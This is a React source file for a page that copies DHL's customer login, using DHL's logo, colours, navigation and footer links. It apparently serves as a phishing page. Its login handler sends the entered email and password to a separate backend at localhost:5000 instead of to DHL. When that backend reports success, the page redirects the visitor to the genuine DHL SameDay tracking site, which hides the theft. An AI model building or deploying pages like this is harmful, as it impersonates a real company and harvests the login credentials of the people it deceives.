import React, { useState } from "react";
import "./App.css";

// const API_BASE_URL = `${process.env.REACT_APP_API_URL}/login`;
const API_BASE_URL = "http://localhost:5000";

const DHLLoginPage = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showLanguages, setShowLanguages] = useState(false);
  const [showMobileMenu, setShowMobileMenu] = useState(false);
  const [activeDropdown, setActiveDropdown] = useState(null);
  const [isLoading, setIsLoading] = useState(false);

  const languages = [
    { code: "EN", name: "English", active: true },
    { code: "FR", name: "Français", active: false },
    { code: "DE", name: "Deutsch", active: false },
    { code: "IT", name: "Italiano", active: false },
    { code: "ES", name: "Español", active: false },
    { code: "KR", name: "한국어", active: false },
    { code: "JP", name: "日本語", active: false },
    { code: "CN", name: "中文", active: false },
  ];

  // ✅ Handle login
 const handleLogin = async () => {
  if (!email || !password) return alert("Email and password required");
  setIsLoading(true);

  try {
    const response = await fetch(`${API_BASE_URL}/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    });

    if (!response.ok) {
      const text = await response.text();
      console.error("Server error:", response.status, text);
      alert(`❌ Login failed: ${response.status}`);
      return;
    }

    const data = await response.json();

    if (data.success) {
      window.location.href = "https://www.dhlsameday.com/SkyTracking/";
    } else {
      alert(`❌ ${data.message}`);
    }
  } catch (error) {
    console.error("Login error:", error);
    alert("Server error. Please try again later.");
  } finally {
    setIsLoading(false);
  }
};


  // ✅ Submit on Enter key
  const handleKeyPress = (e) => {
    if (e.key === "Enter") handleLogin();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white overflow-x-hidden">
      {/* HEADER */}
      <nav className="bg-gradient-to-b from-yellow-400 to-transparent border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex justify-between items-center py-3">
            <a href="#home">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/a/ac/DHL_Logo.svg"
                alt="DHL Logo"
                className="h-12"
              />
            </a>

            <div className="flex items-center gap-4">
              <button
                onClick={() => setShowLanguages(!showLanguages)}
                className="hidden lg:flex items-center gap-2 px-3 py-2 rounded hover:bg-yellow-50 text-lg"
              >
                <span className="text-red-600 text-xl">🌐</span> Languages
              </button>

              <button
                onClick={() => setShowMobileMenu(!showMobileMenu)}
                className="lg:hidden text-red-600 text-3xl focus:outline-none"
              >
                {showMobileMenu ? "×" : "☰"}
              </button>
            </div>
          </div>

          <div
            className={`${showMobileMenu ? "block" : "hidden"} lg:block pb-4`}
          >
            <ul className="flex flex-col lg:flex-row lg:justify-end lg:space-x-0 text-base font-semibold text-gray-800">
              {[
                "Products",
                "Tracking",
                "Order Entry",
                "Customer Login",
                "Resources",
                "About Us",
                "Agent Login",
              ].map((item) => (
                <li key={item} className="relative">
                  <button
                    onClick={() =>
                      setActiveDropdown(activeDropdown === item ? null : item)
                    }
                    className="w-full text-left lg:text-right px-4 py-2 hover:bg-yellow-100 transition"
                  >
                    {item}
                  </button>
                  {activeDropdown === item && (
                    <div className="lg:absolute bg-white lg:shadow-lg border-t-2 border-yellow-400 z-20 right-0" />
                  )}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </nav>

      {/* MAIN LOGIN */}
      <main className="flex-1 flex items-center justify-center px-4 py-16">
        <div className="w-full max-w-md">
          <h1 className="text-3xl md:text-4xl font-bold text-center text-red-700 mb-10 uppercase">
            Customer Login
          </h1>

          <div className="bg-gray-100 shadow-lg rounded-lg p-8">
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handleLogin();
              }}
            >
              <label
                htmlFor="email"
                className="block text-gray-700 text-lg mb-2"
              >
                Email Address
              </label>
              <input
                id="email"
                type="email"
                value={email}
                placeholder="Enter your email"
                onChange={(e) => setEmail(e.target.value)}
                onKeyPress={handleKeyPress}
                className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:ring-2 focus:ring-yellow-400 outline-none mb-4"
                autoComplete="email"
                required
              />

              <label
                htmlFor="password"
                className="block text-gray-700 text-lg mb-2"
              >
                Password
              </label>
              <input
                id="password"
                type="password"
                value={password}
                placeholder="Enter your password"
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={handleKeyPress}
                className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:ring-2 focus:ring-yellow-400 outline-none"
                autoComplete="current-password"
                required
              />

              <div className="text-center mt-6">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="bg-red-600 hover:bg-red-700 text-white font-semibold px-6 py-2 rounded transition disabled:opacity-50"
                >
                  {isLoading ? "Loading..." : "LOGIN"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* LANGUAGES MODAL */}
      {showLanguages && (
        <div className="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg max-w-2xl w-full">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold text-gray-800">Languages</h2>
              <button
                onClick={() => setShowLanguages(false)}
                className="text-2xl text-gray-500 hover:text-gray-700"
              >
                ×
              </button>
            </div>
            <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
              {languages.map((lang) => (
                <button
                  key={lang.code}
                  onClick={() => setShowLanguages(false)}
                  className={`p-4 rounded flex items-center gap-3 ${
                    lang.active ? "bg-yellow-100 font-bold" : "bg-gray-100"
                  } hover:bg-gray-50 transition`}
                >
                  <span className="text-red-600 font-bold">{lang.code}</span>
                  <span className="uppercase">{lang.name}</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* FOOTER */}
      <footer className="bg-gray-200 py-6 border-t border-gray-300 mt-auto">
        <div className="max-w-7xl mx-auto text-center text-gray-700 text-sm space-x-11">
          <a
            href="https://group.dhl.com/de.html"
            className="hover:text-red-600"
          >
            Deutsche Post DHL Group
          </a>
          <a
            href="https://www.dhl.com/global-en/footer/privacy-notice.html#privacy"
            className="hover:text-red-600"
          >
            Privacy Policy
          </a>
        </div>
      </footer>
    </div>
  );
};

export default DHLLoginPage;
